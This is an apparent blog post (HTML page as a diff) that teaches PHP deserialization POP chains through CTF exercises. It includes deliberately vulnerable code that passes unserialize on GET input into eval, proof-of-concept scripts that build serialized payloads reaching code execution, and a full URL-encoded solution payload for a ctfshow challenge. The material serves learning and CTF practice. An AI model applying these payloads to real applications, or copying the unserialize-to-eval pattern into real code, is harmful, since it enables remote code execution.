@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>php_反序列化_2 | dayu&#39;s blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。
+easy &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } unserialize($_GET[&#39;err&#39;]); ?&gt; 反向构造pop链，errorr2::func()-&gt;errorr0::__destruct()-&gt;errorr0::__construct
+poc &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } $a = new errorr0; $a-&gt;var=new errorr2; $a-&gt;var-&gt;data=&#39;phpinfo();&#39;; echo serialize($a);	//O:7:&#34;errorr0&#34;:1:{s:3:&#34;var&#34;;O:7:&#34;errorr2&#34;:1:{s:4:&#34;data&#34;;s:10:&#34;phpinfo();&#34;;}} //`errorr2::func()`-&gt;`errorr0::__destruct()`-&gt;`errorr0::__construct` ?">
+<meta name="author" content="dayu">
+<link rel="canonical" href="https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8b523f1730c922e314350296d83fd666efa16519ca136320a93df674d00b6325.css" integrity="sha256-i1I/FzDJIuMUNQKW2D/WZu&#43;hZRnKE2MgqT32dNALYyU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://killdayu.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://killdayu.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://killdayu.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://killdayu.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://killdayu.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<link rel="stylesheet" href="/js/katex/katex.min.css" >
+<script src="/js/katex/katex.min.js" > </script>
+<script src="/js/katex/contrib/auto-render.min.js" ></script>
+ 
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+      renderMathInElement(document.body);
+    });
+</script><meta property="og:title" content="php_反序列化_2" />
+<meta property="og:description" content="pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。
+easy &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } unserialize($_GET[&#39;err&#39;]); ?&gt; 反向构造pop链，errorr2::func()-&gt;errorr0::__destruct()-&gt;errorr0::__construct
+poc &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } $a = new errorr0; $a-&gt;var=new errorr2; $a-&gt;var-&gt;data=&#39;phpinfo();&#39;; echo serialize($a);	//O:7:&#34;errorr0&#34;:1:{s:3:&#34;var&#34;;O:7:&#34;errorr2&#34;:1:{s:4:&#34;data&#34;;s:10:&#34;phpinfo();&#34;;}} //`errorr2::func()`-&gt;`errorr0::__destruct()`-&gt;`errorr0::__construct` ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_2/" /><meta property="og:image" content="https://killdayu.com/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-21T13:48:27&#43;08:00" />
+<meta property="article:modified_time" content="2022-07-21T13:48:27&#43;08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://killdayu.com/papermod-cover.png"/>
+
+<meta name="twitter:title" content="php_反序列化_2"/>
+<meta name="twitter:description" content="pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。
+easy &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } unserialize($_GET[&#39;err&#39;]); ?&gt; 反向构造pop链，errorr2::func()-&gt;errorr0::__destruct()-&gt;errorr0::__construct
+poc &lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-&gt;var = new errorr1(); } function __destruct() { $this-&gt;var-&gt;func(); } } class errorr1 { public $var; function func() { echo $this-&gt;var; } } class errorr2 { private $data; public function func() { eval($this-&gt;data); } } $a = new errorr0; $a-&gt;var=new errorr2; $a-&gt;var-&gt;data=&#39;phpinfo();&#39;; echo serialize($a);	//O:7:&#34;errorr0&#34;:1:{s:3:&#34;var&#34;;O:7:&#34;errorr2&#34;:1:{s:4:&#34;data&#34;;s:10:&#34;phpinfo();&#34;;}} //`errorr2::func()`-&gt;`errorr0::__destruct()`-&gt;`errorr0::__construct` ?"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://killdayu.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "php_反序列化_2",
+      "item": "https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "php_反序列化_2",
+  "name": "php_反序列化_2",
+  "description": "pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。\neasy \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr1(); } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data; public function func() { eval($this-\u0026gt;data); } } unserialize($_GET[\u0026#39;err\u0026#39;]); ?\u0026gt; 反向构造pop链，errorr2::func()-\u0026gt;errorr0::__destruct()-\u0026gt;errorr0::__construct\npoc \u0026lt;?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u0026gt;var = new errorr1(); } function __destruct() { $this-\u0026gt;var-\u0026gt;func(); } } class errorr1 { public $var; function func() { echo $this-\u0026gt;var; } } class errorr2 { private $data; public function func() { eval($this-\u0026gt;data); } } $a = new errorr0; $a-\u0026gt;var=new errorr2; $a-\u0026gt;var-\u0026gt;data=\u0026#39;phpinfo();\u0026#39;; echo serialize($a);\t//O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;var\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:4:\u0026#34;data\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} //`errorr2::func()`-\u0026gt;`errorr0::__destruct()`-\u0026gt;`errorr0::__construct` ?",
+  "keywords": [
+    
+  ],
+  "articleBody": "pop链 pop链，通过反序列化控制class属性，来构造一条完整的利用链。\neasy \u003c?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u003evar = new errorr1(); } function __destruct() { $this-\u003evar-\u003efunc(); } } class errorr1 { public $var; function func() { echo $this-\u003evar; } } class errorr2 { private $data; public function func() { eval($this-\u003edata); } } unserialize($_GET['err']); ?\u003e 反向构造pop链，errorr2::func()-\u003eerrorr0::__destruct()-\u003eerrorr0::__construct\npoc \u003c?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u003evar = new errorr1(); } function __destruct() { $this-\u003evar-\u003efunc(); } } class errorr1 { public $var; function func() { echo $this-\u003evar; } } class errorr2 { private $data; public function func() { eval($this-\u003edata); } } $a = new errorr0; $a-\u003evar=new errorr2; $a-\u003evar-\u003edata='phpinfo();'; echo serialize($a);\t//O:7:\"errorr0\":1:{s:3:\"var\";O:7:\"errorr2\":1:{s:4:\"data\";s:10:\"phpinfo();\";}} //`errorr2::func()`-\u003e`errorr0::__destruct()`-\u003e`errorr0::__construct` ?\u003e 但是这样会报错。\n因为class里面的属性不是public。我们更改一下class的属性\n成功rce。但是我们如何在不修改class的属性下进行更改呢？这个时候就需要利用构造函数以及在内部修改。\n\u003c?php //error_reporting(0); highlight_file(__FILE__); class errorr0{ protected $var; function __construct() { $this-\u003evar = new errorr2();\t//errorr1-\u003eerrorr2 } function __destruct() { $this-\u003evar-\u003efunc(); } } class errorr1 { public $var; function func() { echo $this-\u003evar; } } class errorr2 { private $data = 'phpinfo();';\t//$data-\u003e'phpinfo();' public function func() { eval($this-\u003edata); } } $a = new errorr0; // $a-\u003evar=new errorr2; // $a-\u003evar-\u003edata='phpinfo();'; echo serialize($a);\t//O:7:\"errorr0\":1:{s:6:\"*var\";O:7:\"errorr2\":1:{s:13:\"errorr2data\";s:10:\"phpinfo();\";}} echo \"\n\"; print_r($a);\t//errorr0 Object ( [var:protected] =\u003e errorr2 Object ( [data:errorr2:private] =\u003e phpinfo(); ) ) echo \"\n\";\t//可以看见$a class的属性也打印出来了 echo urlencode(serialize($a));\t//由于有private和protected属性，所以存在不可见字符（%00）需要url编码。 //`errorr2::func()`-\u003e`errorr0::__destruct()`-\u003e`errorr0::__construct` ?\u003e 对比一下poc的差异\nprint_r 1.\terrorr0 Object ( [var] =\u003e errorr2 Object ( [data] =\u003e phpinfo(); ) ) 2.\terrorr0 Object ( [var:protected] =\u003e errorr2 Object ( [data:errorr2:private] =\u003e phpinfo(); ) ) 反序列化 1.\tO:7:\"errorr0\":1:{s:3:\"var\";O:7:\"errorr2\":1:{s:4:\"data\";s:10:\"phpinfo();\";}} 2.\tO:7:\"errorr0\":1:{s:6:\"*var\";O:7:\"errorr2\":1:{s:13:\"errorr2data\";s:10:\"phpinfo();\";}} test \u003c?php //error_reporting(0); highlight_file(__FILE__); class w44m{ private $admin = 'aaa'; protected $passwd = '123456'; public function Getflag(){ if($this-\u003eadmin === 'w44m' \u0026\u0026 $this-\u003epasswd ==='08067'){ include('flag.php'); echo $flag; }else{ echo $this-\u003eadmin; echo $this-\u003epasswd; echo 'nono'; } } } class w22m{ public $w00m; public function __destruct(){ echo $this-\u003ew00m; } } class w33m{ public $w00m; public $w22m; public function __toString(){ $this-\u003ew00m-\u003e{$this-\u003ew22m}(); return 0; } } $w00m = $_GET['w00m']; unserialize($w00m); ?\u003e 反向构造pop链，w44m::Getflag()-\u003ew33m::__toString()-\u003ew22m::__destruct()\npoc \u003c?php //error_reporting(0); highlight_file(__FILE__); class w44m{ private $admin = 'w44m';\t//手动改一下 protected $passwd = '08067';\t//手动改一下 public function Getflag(){ if($this-\u003eadmin === 'w44m' \u0026\u0026 $this-\u003epasswd ==='08067'){ include('flag.php'); echo $flag; }else{ echo $this-\u003eadmin; echo $this-\u003epasswd; echo 'nono'; } } } class w22m{ public $w00m; public function __destruct(){ echo $this-\u003ew00m; } } class w33m{ public $w00m; public $w22m; public function __toString(){ echo \"w33m __toString\". \"\n\"; $this-\u003ew00m-\u003e{$this-\u003ew22m}(); return 0; } } $a = new w22m; $a-\u003ew00m=new w33m; $a-\u003ew00m-\u003ew00m=new w44m; $a-\u003ew00m-\u003ew22m='Getflag'; echo \"\n\"; print_r($a);\t//w22m Object ( [w00m] =\u003e w33m Object ( [w00m] =\u003e w44m Object ( [admin:w44m:private] =\u003e w44m [passwd:protected] =\u003e 08067 ) [w22m] =\u003e Getflag ) ) echo \"\n\"; echo serialize($a); echo \"\n\"; echo urlencode(serialize($a)); //`w44m::Getflag()`-\u003e`w33m::__toString()`-\u003e`w22m::__destruct()` ?\u003e ctf 先学习一些tips。\ntips __get() \u003c?php highlight_file(__FILE__); class A { private $test; function __get($a){ echo $a;\t//test2 } } $a = new A; $a-\u003etest2; ?\u003e 当访问一个不存在的变量时，变量名会传递给__get()。\n__call() \u003c?php highlight_file(__FILE__); class A { private $test; function __get($a){ echo $a; } function __call($b,$c){ echo $b;\t//test3 print_r($c);\t//Array ( [0] =\u003e test4 ) } } $a = new A; $a-\u003etest2; $a-\u003etest3(test4); ?\u003e 当访问一个不存在的函数时，函数名和实参会被传递给__call()\ncall_user_func() \u003c?php highlight_file(__FILE__); function hello($a) { echo \"hello \". $a; } call_user_func(hello,dayu); class A { function hello1($a) { echo \"hello \". $a; } } call_user_func([A, hello1], dayu1) ?\u003e call_user_func(函数, 参数)\ncall_user_func([类, 方法], 参数)\narray_walk() \u003c?php highlight_file(__FILE__); echo \"\n\"; function myfunction($value,$key,$p) { echo \"$key $p $value\n\"; } $a=array(\"a\"=\u003e\"red\",\"b\"=\u003e\"green\",\"c\"=\u003e\"blue\"); array_walk($a,\"myfunction\",\"has the value\");\t//array_walk(array,myfunction,parameter...) ?\u003e array_walk(数组, 函数, 另外一个参数)\ngc tmp\ncode \u003c?php /** * @Author: F10wers_13eiCheng * @Date: 2022-02-01 11:25:02 * @Last Modified by: F10wers_13eiCheng * @Last Modified time: 2022-02-07 15:08:18 */ highlight_file(__FILE__); include(\"./HappyYear.php\"); class one { public $object; public function MeMeMe() { echo \"one::MeMeMe()\"; array_walk($this, function($fn, $prev){ echo \"one::MeMeMe()::array_walk()\"; if ($fn[0] === \"Happy_func\" \u0026\u0026 $prev === \"year_parm\") { global $talk; echo \"$talk\".\"\"; global $flag; echo $flag; } }); } public function __destruct() { echo \"one::__destruct()\"; @$this-\u003eobject-\u003eadd(); } public function __toString() { echo \"one::__toString()\"; return $this-\u003eobject-\u003estring; } } class second { protected $filename; protected function addMe() { echo \"second::addMe()\"; return \"Wow you have sovled\".$this-\u003efilename; } public function __call($func, $args) { echo \"second::__call()\"; call_user_func([$this, $func.\"Me\"], $args); } } class third { private $string; public function __construct($string) { echo \"third::__construct()\"; $this-\u003estring = $string; } public function __get($name) { echo \"third::__get()\"; $var = $this-\u003e$name; $var[$name](); } } if (isset($_GET[\"ctfshow\"])) { $a=unserialize($_GET['ctfshow']); //throw new Exception(\"高一新生报道\");\t先注释掉，方便调试。 } else { echo \"please get ctfshow\"; } pop链 现在来反向构造pop利用链，one::MeMeMe()-\u003ethird::__get()-\u003e…\n正向构造一下试试，one::__destruct()-\u003esecond::__call()-\u003esecond::addMe()-\u003eone::__toString()-\u003e…\n结合一下，整个正向pop链为：one::__destruct()-\u003esecond::__call()-\u003esecond::addMe()-\u003eone::__toString()-\u003ethird::__get()-\u003eone::MeMeMe()\n首先通过one::__destruct()调用一个不存在的add()去触发second::__call()然后通过call_user_func()回调自身的second::addMe()这里return了一个String类型，所以可以去触发one::__toString()然后返回了一个不存在的string变量去触发third::__get()，最后在调用one::MeMeMe()拿到flag。\n擦，昨天弄2小时，今天弄了快3小时，现在闭着眼都能写出来了。\n\u003c?php /** * @Author: F10wers_13eiCheng * @Date: 2022-02-01 11:25:02 * @Last Modified by: F10wers_13eiCheng * @Last Modified time: 2022-02-07 15:08:18 */ highlight_file(__FILE__); include(\"./HappyYear.php\"); class one { public $object; public $year_parm = array(\"Happy_func\");\t//构造一个数组 public function MeMeMe() { echo \"one::MeMeMe()\"; array_walk($this, function($fn, $prev){\t//当array_walk传入类的时候会将类里面的变量名和变量名当成数组。 echo \"one::MeMeMe()::array_walk()\"; if ($fn[0] === \"Happy_func\" \u0026\u0026 $prev === \"year_parm\") {\t//$year_parm = array(\"Happy_func\") global $talk; echo \"$talk\".\"\"; global $flag; echo $flag; } }); } public function __destruct() { echo \"one::__destruct()\"; @$this-\u003eobject-\u003eadd(); } public function __toString() { echo \"one::__toString()\"; return $this-\u003eobject-\u003estring; } } class second { protected $filename; public function __construct() { $this-\u003efilename = new one; $this-\u003efilename-\u003eobject = new third([\"string\"=\u003e[new one(),\"MeMeMe\"]]); }\t//手动构造`__construct`用来触发下面的`second::addMe()`-\u003e`one::__toString()`，同时给`third::__construct`传入实参。 protected function addMe() { echo \"second::addMe()\"; return \"Wow you have sovled\".$this-\u003efilename; } public function __call($func, $args) { echo \"second::__call()\"; call_user_func([$this, $func.\"Me\"], $args); } } class third { private $string; public function __construct($string) { echo \"third::__construct()\"; $this-\u003estring = $string;\t//string = [\"string\"=\u003e[new one(),\"MeMeMe\"]] } public function __get($name) { echo \"third::__get()\"; $var = $this-\u003e$name; $var[$name]();\t//[\"string\"=\u003e[new one(),\"MeMeMe\"]][string]()这里会触发`third::__get()`-\u003e`one::MeMeMe()` } } $a = new one; $b = new second; $a-\u003eobject = $b; //`one::__destruct()`-\u003e`second::__call()`-\u003e`second::addMe()` //`one::__destruct()`-\u003e`second::__call()`-\u003e`second::addMe()`-\u003e`one::__toString()`-\u003e`third::__get()`-\u003e`one::MeMeMe()` echo \"\". serialize($a). \"\"; echo \"\". urlencode(serialize($a)). \"\"; O:3:\"one\":2:{s:6:\"object\";O:6:\"second\":1:{s:11:\"*filename\";O:3:\"one\":2:{s:6:\"object\";O:5:\"third\":1:{s:13:\"thirdstring\";a:1:{s:6:\"string\";a:2:{i:0;O:3:\"one\":2:{s:6:\"object\";N;s:9:\"year_parm\";a:1:{i:0;s:10:\"Happy_func\";}}i:1;s:6:\"MeMeMe\";}}}s:9:\"year_parm\";a:1:{i:0;s:10:\"Happy_func\";}}}s:9:\"year_parm\";a:1:{i:0;s:10:\"Happy_func\";}} O%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D demo \u003c?php highlight_file(__FILE__); class one { public $key = 'value'; public $year_parm = array(0=\u003e\"Happy_func\"); function MeMeMe(){ echo \"yes\"; } function test(){ echo \"one::test\"; array_walk($this, function($fn, $prev){ echo \"one::test::array_walk\"; print_r($fn); echo \"\"; print_r($prev); echo \"\"; }); } } [\"string\"=\u003e[new one(),\"MeMeMe\"]][string](); $a = new one(); $a-\u003etest(); 还有个垃圾回收GC机制来绕过异常处理的，明天来写吧，今天累了。\n",
+  "wordCount" : "918",
+  "inLanguage": "en",
+  "datePublished": "2022-07-21T13:48:27+08:00",
+  "dateModified": "2022-07-21T13:48:27+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "dayu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://killdayu.com/posts/php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "dayu's blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://killdayu.com/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://killdayu.com/" accesskey="h" title="dayu&#39;s blog (Alt + H)">dayu&#39;s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://killdayu.com/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://killdayu.com/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://killdayu.com/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://killdayu.com/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://killdayu.com/">Home</a>&nbsp;»&nbsp;<a href="https://killdayu.com/posts/">Posts</a></div>
+    <h1 class="post-title">
+      php_反序列化_2
+    </h1>
+    <div class="post-meta"><span title='2022-07-21 13:48:27 +0800 CST'>July 21, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;dayu
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#pop%e9%93%be" aria-label="pop链">pop链</a><ul>
+                        
+                <li>
+                    <a href="#easy" aria-label="easy">easy</a><ul>
+                        
+                <li>
+                    <a href="#poc" aria-label="poc">poc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#test" aria-label="test">test</a><ul>
+                        
+                <li>
+                    <a href="#poc-1" aria-label="poc">poc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ctf" aria-label="ctf">ctf</a><ul>
+                        
+                <li>
+                    <a href="#tips" aria-label="tips">tips</a><ul>
+                        
+                <li>
+                    <a href="#__get" aria-label="__get()">__get()</a></li>
+                <li>
+                    <a href="#__call" aria-label="__call()">__call()</a></li>
+                <li>
+                    <a href="#call_user_func" aria-label="call_user_func()">call_user_func()</a></li>
+                <li>
+                    <a href="#array_walk" aria-label="array_walk()">array_walk()</a></li>
+                <li>
+                    <a href="#gc" aria-label="gc">gc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#code" aria-label="code">code</a></li>
+                <li>
+                    <a href="#pop%e9%93%be-1" aria-label="pop链">pop链</a></li>
+                <li>
+                    <a href="#demo" aria-label="demo">demo</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="pop链">pop链<a hidden class="anchor" aria-hidden="true" href="#pop链">#</a></h1>
+<p>pop链，通过反序列化控制class属性，来构造一条完整的利用链。</p>
+<h2 id="easy">easy<a hidden class="anchor" aria-hidden="true" href="#easy">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//error_reporting(0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr0</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">errorr1</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr2</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;err&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>反向构造pop链，<code>errorr2::func()</code>-&gt;<code>errorr0::__destruct()</code>-&gt;<code>errorr0::__construct</code></p>
+<h3 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//error_reporting(0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">errorr0</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
